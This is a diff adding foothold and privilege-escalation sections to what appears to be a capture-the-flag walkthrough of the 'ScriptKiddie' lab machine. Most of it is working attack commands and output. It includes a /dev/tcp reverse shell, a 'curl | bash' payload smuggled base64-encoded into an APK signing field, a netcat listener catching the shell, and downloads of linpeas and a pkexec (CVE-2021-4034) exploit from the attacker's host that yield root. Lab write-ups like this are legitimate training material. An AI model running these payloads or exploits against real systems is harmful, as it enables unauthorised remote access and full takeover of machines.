@@ -178,4 +178,169 @@ nc -lnvp 4444
 upload evil.apk template:
 ![template](IMG/uptemplate.png)
 
+# FOOTHOLD
 
+After some tryings, seems this is not working, only get "Something went wrong" messsage from website. 
+Let's change reverseshell papyload. Create localfile script revshell.sh:
+
+```shell
+cat revshell.sh                                                                                                                      main 
+/usr/bin/bash -i >& /dev/tcp/10.10.14.4/7777 0>&1
+```
+
+Change payload variable on python script:
+
+```python
+payload = 'curl http://10.10.14.4/revshell.sh | bash'
+```
+
+Generate apk with new payload:
+
+```shell
+python 49491.py                                                                                                                      main 
+[+] Manufacturing evil apkfile
+Payload: curl http://10.10.14.4/revshell.sh | bash
+-dname: CN='|echo Y3VybCBodHRwOi8vMTAuMTAuMTQuNC9yZXZzaGVsbC5zaCB8IGJhc2g= | base64 -d | sh #
+
+  adding: empty (stored 0%)
+jar signed.
+
+Warning: 
+The signer's certificate is self-signed.
+The SHA1 algorithm specified for the -digestalg option is considered a security risk and is disabled.
+The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk and is disabled.
+POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.
+
+[+] Done! apkfile is at /tmp/tmpuijw520a/evil.apk
+Do: msfvenom -x /tmp/tmpuijw520a/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 PORT=7777 -o /dev/null
+```
+
+
+Start python http server and netcat on port 7777:
+
+```shell
+sudo python -m http.server 80
+[sudo] password for user: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.11.122 - - [06/Nov/2022 19:44:37] "GET /revshell.sh HTTP/1.1" 200 -
+```
+
+file revshell.sh has curled by server, lets check nc session:
+
+```shell
+nc -lnvp 7777                                                                                                               main 
+Connection from 10.129.11.122:41170
+bash: cannot set terminal process group (940): Inappropriate ioctl for device
+bash: no job control in this shell
+kid@scriptkiddie:~/html$ id
+id
+uid=1000(kid) gid=1000(kid) groups=1000(kid)
+kid@scriptkiddie:~/html$ 
+```
+
+Works!
+
+Get the user flag:
+
+```shell
+kid@scriptkiddie:~$ cat user.txt
+cat user.txt
+09028e17d66ea64b9c4dfe58096962f1
+kid@scriptkiddie:~$ 
+```
+
+# PRIVESC 
+
+Get lineas script:
+```shell
+kid@scriptkiddie:~$ wget http://10.10.14.4/linpeas.sh
+wget http://10.10.14.4/linpeas.sh
+--2022-11-06 18:59:57--  http://10.10.14.4/linpeas.sh
+Connecting to 10.10.14.4:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 827827 (808K) [application/x-sh]
+Saving to: ‘linpeas.sh’
+
+     0K .......... .......... .......... .......... ..........  6%  708K 1s
+    50K .......... .......... .......... .......... .......... 12% 1.44M 1s
+   100K .......... .......... .......... .......... .......... 18% 21.7M 0s
+   150K .......... .......... .......... .......... .......... 24% 1.59M 0s
+   200K .......... .......... .......... .......... .......... 30% 22.0M 0s
+   250K .......... .......... .......... .......... .......... 37% 39.4M 0s
+   300K .......... .......... .......... .......... .......... 43% 22.0M 0s
+   350K .......... .......... .......... .......... .......... 49% 1.85M 0s
+   400K .......... .......... .......... .......... .......... 55% 11.9M 0s
+   450K .......... .......... .......... .......... .......... 61% 40.2M 0s
+   500K .......... .......... .......... .......... .......... 68% 14.2M 0s
+   550K .......... .......... .......... .......... .......... 74% 45.1M 0s
+   600K .......... .......... .......... .......... .......... 80% 37.3M 0s
+   650K .......... .......... .......... .......... .......... 86% 35.7M 0s
+   700K .......... .......... .......... .......... .......... 92% 27.7M 0s
+   750K .......... .......... .......... .......... .......... 98% 34.7M 0s
+   800K ........                                              100%  129M=0.2s
+
+2022-11-06 18:59:58 (4.26 MB/s) - ‘linpeas.sh’ saved [827827/827827]
+
+kid@scriptkiddie:~$ 
+```
+
+Execute linpeas.sh on server and found some vulneribilities:
+
+```shell
+╔══════════╣ Sudo version
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
+Sudo version 1.8.31
+
+╔══════════╣ CVEs Check
+Vulnerable to CVE-2021-4034
+
+Vulnerable to CVE-2021-3560
+
+Potentially Vulnerable to CVE-2022-2588
+
+```
+
+```shell
+kid@scriptkiddie:~$ wget http://10.10.14.4/pkexec-exploit                                 
+wget http://10.10.14.4/pkexec-exploit
+--2022-11-06 19:13:03--  http://10.10.14.4/pkexec-exploit
+Connecting to 10.10.14.4:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 175360 (171K) [application/octet-stream]
+Saving to: ‘pkexec-exploit’
+
+     0K .......... .......... .......... .......... .......... 29%  699K 0s
+    50K .......... .......... .......... .......... .......... 58% 1.37M 0s
+   100K .......... .......... .......... .......... .......... 87% 9.17M 0s
+   150K .......... .......... .                               100% 23.7M=0.1s
+
+2022-11-06 19:13:03 (1.47 MB/s) - ‘pkexec-exploit’ saved [175360/175360]
+
+kid@scriptkiddie:~$ 
+
+```
+
+execute pkexec python exploit:
+
+```shell
+kid@scriptkiddie:~$ python3 pkexec-exploit                        
+python3 pkexec-exploit
+Do you want to choose a custom payload? y/n (n use default payload)  
+
+
+id
+uid=0(root) gid=1000(kid) groups=1000(kid)
+ls 
+GCONV_PATH=.
+exploit
+html
+linpeas.sh
+logs
+payload.so
+pkexec-exploit
+snap
+user.txt
+cat user.txt
+09028e17d66ea64b9c4dfe58096962f1
+
+```
